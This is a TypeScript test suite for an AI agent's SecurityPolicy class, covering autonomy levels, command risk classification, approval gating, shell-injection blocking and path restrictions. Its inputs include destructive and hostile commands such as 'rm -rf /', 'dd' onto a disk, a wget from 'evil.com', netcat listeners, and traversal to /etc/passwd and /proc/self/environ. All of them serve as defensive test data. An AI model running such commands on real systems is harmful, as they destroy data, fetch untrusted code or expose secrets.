import { describe, test, expect, beforeEach } from "bun:test";
import { SecurityPolicy } from "../../src/security/policy.js";
import { SecurityError } from "../../src/core/errors.js";

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

function makePolicy(
  autonomyLevel: "read_only" | "supervised" | "full",
  overrides: Partial<{
    allowedCommands: string[];
    workspaceDir: string;
    forbiddenPaths: string[];
    blockHighRiskCommands: boolean;
    requireApprovalForMediumRisk: boolean;
  }> = {}
): SecurityPolicy {
  return new SecurityPolicy(autonomyLevel, {
    allowedCommands: ["ls", "cat", "grep"],
    workspaceDir: "/home/user/workspace",
    forbiddenPaths: [],
    blockHighRiskCommands: true,
    requireApprovalForMediumRisk: true,
    ...overrides,
  });
}

// ---------------------------------------------------------------------------
// enforceToolOperation
// ---------------------------------------------------------------------------

describe("SecurityPolicy.enforceToolOperation", () => {
  test("read_only blocks act operations", () => {
    const policy = makePolicy("read_only");
    expect(() => policy.enforceToolOperation("act", "shell")).toThrow(SecurityError);
  });

  test("read_only allows read operations", () => {
    const policy = makePolicy("read_only");
    expect(() => policy.enforceToolOperation("read", "file")).not.toThrow();
  });

  test("supervised allows read operations", () => {
    const policy = makePolicy("supervised");
    expect(() => policy.enforceToolOperation("read", "file")).not.toThrow();
  });

  test("supervised allows act operations", () => {
    const policy = makePolicy("supervised");
    expect(() => policy.enforceToolOperation("act", "shell")).not.toThrow();
  });

  test("full allows read operations", () => {
    const policy = makePolicy("full");
    expect(() => policy.enforceToolOperation("read", "file")).not.toThrow();
  });

  test("full allows act operations", () => {
    const policy = makePolicy("full");
    expect(() => policy.enforceToolOperation("act", "shell")).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// classifyCommandRisk
// ---------------------------------------------------------------------------

describe("SecurityPolicy.classifyCommandRisk", () => {
  const policy = makePolicy("full");

  // High-risk commands
  test("rm is high risk", () => {
    expect(policy.classifyCommandRisk("rm -rf /")).toBe("high");
  });

  test("sudo is high risk", () => {
    expect(policy.classifyCommandRisk("sudo apt-get install")).toBe("high");
  });

  test("chmod is high risk", () => {
    expect(policy.classifyCommandRisk("chmod 777 file.txt")).toBe("high");
  });

  test("curl is high risk", () => {
    expect(policy.classifyCommandRisk("curl https://example.com")).toBe("high");
  });

  test("wget is high risk", () => {
    expect(policy.classifyCommandRisk("wget http://evil.com/script.sh")).toBe("high");
  });

  test("ssh is high risk", () => {
    expect(policy.classifyCommandRisk("ssh user@host")).toBe("high");
  });

  test("dd is high risk", () => {
    expect(policy.classifyCommandRisk("dd if=/dev/zero of=/dev/sda")).toBe("high");
  });

  test("shutdown is high risk", () => {
    expect(policy.classifyCommandRisk("shutdown -h now")).toBe("high");
  });

  test("nc is high risk", () => {
    expect(policy.classifyCommandRisk("nc -l 4444")).toBe("high");
  });

  test("iptables is high risk", () => {
    expect(policy.classifyCommandRisk("iptables -F")).toBe("high");
  });

  // Medium-risk commands
  test("git commit is medium risk", () => {
    expect(policy.classifyCommandRisk("git commit -m 'test'")).toBe("medium");
  });

  test("git push is medium risk", () => {
    expect(policy.classifyCommandRisk("git push origin main")).toBe("medium");
  });

  test("npm install is medium risk", () => {
    expect(policy.classifyCommandRisk("npm install lodash")).toBe("medium");
  });

  test("mkdir is medium risk", () => {
    expect(policy.classifyCommandRisk("mkdir -p src/components")).toBe("medium");
  });

  test("mv is medium risk", () => {
    expect(policy.classifyCommandRisk("mv file.txt backup/")).toBe("medium");
  });

  test("touch is medium risk", () => {
    expect(policy.classifyCommandRisk("touch newfile.ts")).toBe("medium");
  });

  // Low-risk commands
  test("ls is low risk", () => {
    expect(policy.classifyCommandRisk("ls -la")).toBe("low");
  });

  test("cat is low risk", () => {
    expect(policy.classifyCommandRisk("cat file.txt")).toBe("low");
  });

  test("grep is low risk", () => {
    expect(policy.classifyCommandRisk("grep -r 'pattern' src/")).toBe("low");
  });

  test("echo is low risk", () => {
    expect(policy.classifyCommandRisk("echo hello")).toBe("low");
  });

  test("pwd is low risk", () => {
    expect(policy.classifyCommandRisk("pwd")).toBe("low");
  });

  // Unknown → medium (safe default)
  test("unknown command defaults to medium", () => {
    expect(policy.classifyCommandRisk("zorp --flag")).toBe("medium");
  });

  test("strips path prefix from command", () => {
    expect(policy.classifyCommandRisk("/usr/bin/rm -f file")).toBe("high");
  });
});

// ---------------------------------------------------------------------------
// classifyCommandRisk — allowedCommands
// ---------------------------------------------------------------------------

describe("SecurityPolicy.classifyCommandRisk — allowedCommands", () => {
  const policy = makePolicy("full", {
    allowedCommands: ["npx", "node", "python3", "deno"],
  });

  test("npx classified as low-risk via allowedCommands", () => {
    expect(policy.classifyCommandRisk("npx --yes clawhub@latest search")).toBe("low");
  });

  test("node classified as low-risk via allowedCommands", () => {
    expect(policy.classifyCommandRisk("node script.js")).toBe("low");
  });

  test("python3 classified as low-risk via allowedCommands", () => {
    expect(policy.classifyCommandRisk("python3 script.py")).toBe("low");
  });

  test("deno classified as low-risk via allowedCommands", () => {
    expect(policy.classifyCommandRisk("deno run script.ts")).toBe("low");
  });

  test("high-risk commands are NOT overridden by allowedCommands", () => {
    const p = makePolicy("full", { allowedCommands: ["rm"] });
    expect(p.classifyCommandRisk("rm -rf /")).toBe("high");
  });

  test("command not in allowedCommands still defaults to medium", () => {
    expect(policy.classifyCommandRisk("some-unknown-cmd")).toBe("medium");
  });
});

// ---------------------------------------------------------------------------
// validateCommandExecution
// ---------------------------------------------------------------------------

describe("SecurityPolicy.validateCommandExecution", () => {
  test("blocks high-risk command when blockHighRiskCommands=true", () => {
    const policy = makePolicy("supervised", { blockHighRiskCommands: true });
    expect(() => policy.validateCommandExecution("rm -rf /tmp/test", false)).toThrow(SecurityError);
  });

  test("blocks unapproved medium-risk command when requireApprovalForMediumRisk=true", () => {
    const policy = makePolicy("supervised", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: true,
    });
    expect(() => policy.validateCommandExecution("git push origin main", false)).toThrow(SecurityError);
  });

  test("approved medium-risk command passes when requireApprovalForMediumRisk=true", () => {
    const policy = makePolicy("supervised", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: true,
    });
    expect(() => policy.validateCommandExecution("git push origin main", true)).not.toThrow();
  });

  test("returns low risk for low-risk command", () => {
    const policy = makePolicy("full", { blockHighRiskCommands: false });
    const level = policy.validateCommandExecution("ls -la", false);
    expect(level).toBe("low");
  });

  test("read_only blocks all command execution", () => {
    const policy = makePolicy("read_only", { blockHighRiskCommands: false });
    expect(() => policy.validateCommandExecution("ls -la", true)).toThrow(SecurityError);
  });

  test("full autonomy with high risk allowed passes", () => {
    const policy = makePolicy("full", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: false,
    });
    const level = policy.validateCommandExecution("curl https://example.com", false);
    expect(level).toBe("high");
  });

  test("blocks shell injection via subshell operator", () => {
    const policy = makePolicy("full", { blockHighRiskCommands: false });
    expect(() => policy.validateCommandExecution("ls $(whoami)", false)).toThrow(SecurityError);
  });

  test("blocks shell injection via backtick", () => {
    const policy = makePolicy("full", { blockHighRiskCommands: false });
    expect(() => policy.validateCommandExecution("ls `pwd`", false)).toThrow(SecurityError);
  });

  test("blocks pipe to tee", () => {
    const policy = makePolicy("full", { blockHighRiskCommands: false });
    expect(() => policy.validateCommandExecution("ls | tee out.txt", false)).toThrow(SecurityError);
  });

  test("blocks output redirection", () => {
    const policy = makePolicy("full", { blockHighRiskCommands: false });
    expect(() => policy.validateCommandExecution("ls > out.txt", false)).toThrow(SecurityError);
  });

  test("multi-segment command uses highest risk level", () => {
    const policy = makePolicy("full", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: false,
    });
    const level = policy.validateCommandExecution("ls -la; rm file.txt", false);
    expect(level).toBe("high");
  });
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------

describe("SecurityPolicy.validateCommandExecution — supervised vs full", () => {
  test("supervised: medium-risk without approval throws even when requireApprovalForMediumRisk=false", () => {
    // The config flag is irrelevant — supervised mode always requires approval
    const policy = makePolicy("supervised", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: false,
    });
    expect(() => policy.validateCommandExecution("git push origin main", false)).toThrow(SecurityError);
  });

  test("supervised: medium-risk with approval passes", () => {
    const policy = makePolicy("supervised", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: false,
    });
    expect(() => policy.validateCommandExecution("git push origin main", true)).not.toThrow();
  });

  test("full: medium-risk without approval passes (approval check skipped in full mode)", () => {
    const policy = makePolicy("full", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: true,
    });
    // In full mode requireApprovalForMediumRisk config flag is ignored
    expect(() => policy.validateCommandExecution("git push origin main", false)).not.toThrow();
  });

  test("full: medium-risk without approval returns medium", () => {
    const policy = makePolicy("full", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: true,
    });
    const level = policy.validateCommandExecution("git commit -m test", false);
    expect(level).toBe("medium");
  });

  test("full: high-risk without approval passes when blockHighRiskCommands=false", () => {
    const policy = makePolicy("full", {
      blockHighRiskCommands: false,
      requireApprovalForMediumRisk: true,
    });
    const level = policy.validateCommandExecution("curl https://example.com", false);
    expect(level).toBe("high");
  });

  test("supervised: high-risk without approval throws (blocked before approval check)", () => {
    const policy = makePolicy("supervised", {
      blockHighRiskCommands: true,
      requireApprovalForMediumRisk: false,
    });
    expect(() => policy.validateCommandExecution("rm -rf /tmp/test", false)).toThrow(SecurityError);
  });
});

// ---------------------------------------------------------------------------
// isPathAllowed
// ---------------------------------------------------------------------------

describe("SecurityPolicy.isPathAllowed", () => {
  const policy = makePolicy("full", {
    workspaceDir: "/home/user/workspace",
    forbiddenPaths: [],
  });

  test("rejects path with null byte", () => {
    expect(policy.isPathAllowed("/home/user/workspace/file\0evil")).toBe(false);
  });

  test("rejects path with .. traversal component", () => {
    expect(policy.isPathAllowed("/home/user/workspace/../../../etc/passwd")).toBe(false);
  });

  test("rejects URL-encoded slash %2f", () => {
    expect(policy.isPathAllowed("/home/user/workspace%2fetc/passwd")).toBe(false);
  });

  test("rejects URL-encoded slash %2F uppercase", () => {
    expect(policy.isPathAllowed("/home/user/workspace%2Fetc/passwd")).toBe(false);
  });

  test("rejects ~username form (tilde followed by non-slash)", () => {
    expect(policy.isPathAllowed("~root/secret")).toBe(false);
  });

  test("allows bare ~/ path (tilde-slash is ok at layer 4)", () => {
    // ~/... is allowed at layer 4 (expanded by layer 6 check if needed)
    // The layer 4 rule: reject ~user (tilde followed by non-/ character)
    // ~/... starts with ~/ so it passes layer 4 — it's a normal home-relative path
    expect(policy.isPathAllowed("~/safe-file.txt")).toBe(true);
  });

  test("rejects absolute path outside workspaceDir", () => {
    expect(policy.isPathAllowed("/home/user/other/file.txt")).toBe(false);
  });

  test("allows absolute path inside workspaceDir", () => {
    expect(policy.isPathAllowed("/home/user/workspace/src/main.ts")).toBe(true);
  });

  test("allows relative path (no absolute check triggered)", () => {
    expect(policy.isPathAllowed("src/main.ts")).toBe(true);
  });

  test("rejects path starting with /etc", () => {
    const p = makePolicy("full", { workspaceDir: "/any" });
    expect(p.isPathAllowed("/etc/passwd")).toBe(false);
  });

  test("rejects path starting with /root", () => {
    const p = makePolicy("full", { workspaceDir: "/any" });
    expect(p.isPathAllowed("/root/.bashrc")).toBe(false);
  });

  test("rejects path starting with /sys", () => {
    const p = makePolicy("full", { workspaceDir: "/any" });
    expect(p.isPathAllowed("/sys/kernel/debug")).toBe(false);
  });

  test("rejects path starting with /proc", () => {
    const p = makePolicy("full", { workspaceDir: "/any" });
    expect(p.isPathAllowed("/proc/self/environ")).toBe(false);
  });

  test("allows workspaceDir itself", () => {
    expect(policy.isPathAllowed("/home/user/workspace")).toBe(true);
  });

  test("allows workspaceDir with trailing slash", () => {
    expect(policy.isPathAllowed("/home/user/workspace/")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Shell lexer (via validateCommandExecution — tested through behavior)
// ---------------------------------------------------------------------------

describe("SecurityPolicy shell lexer", () => {
  const policy = makePolicy("full", {
    blockHighRiskCommands: false,
    requireApprovalForMediumRisk: false,
  });

  test("quoted string with semicolon is not split", () => {
    // "echo 'hello;world'" — semicolon is quoted, no injection
    const level = policy.validateCommandExecution("echo 'hello;world'", false);
    expect(level).toBe("low");
  });

  test("double-quoted semicolon is not split", () => {
    const level = policy.validateCommandExecution('echo "hello;world"', false);
    expect(level).toBe("low");
  });

  test("unquoted semicolon splits into two segments", () => {
    // ls ; rm → two segments, rm is high-risk
    // blockHighRiskCommands=false so it just returns the highest risk
    const level = policy.validateCommandExecution("ls; rm file.txt", false);
    expect(level).toBe("high");
  });

  test("unquoted pipe splits into two segments", () => {
    // ls | grep → grep is low, ls is low → low
    const level = policy.validateCommandExecution("ls | grep pattern", false);
    expect(level).toBe("low");
  });

  test("blocks background operator &", () => {
    expect(() => policy.validateCommandExecution("sleep 10 &", false)).toThrow(SecurityError);
  });

  test("blocks input redirection <", () => {
    expect(() => policy.validateCommandExecution("cat < /etc/passwd", false)).toThrow(SecurityError);
  });

  test("blocks append redirection >>", () => {
    expect(() => policy.validateCommandExecution("echo text >> file.txt", false)).toThrow(SecurityError);
  });

  test("blocks process substitution <(", () => {
    expect(() => policy.validateCommandExecution("diff <(ls dir1) <(ls dir2)", false)).toThrow(SecurityError);
  });

  test("blocks variable expansion ${", () => {
    expect(() => policy.validateCommandExecution("echo ${PATH}", false)).toThrow(SecurityError);
  });
});
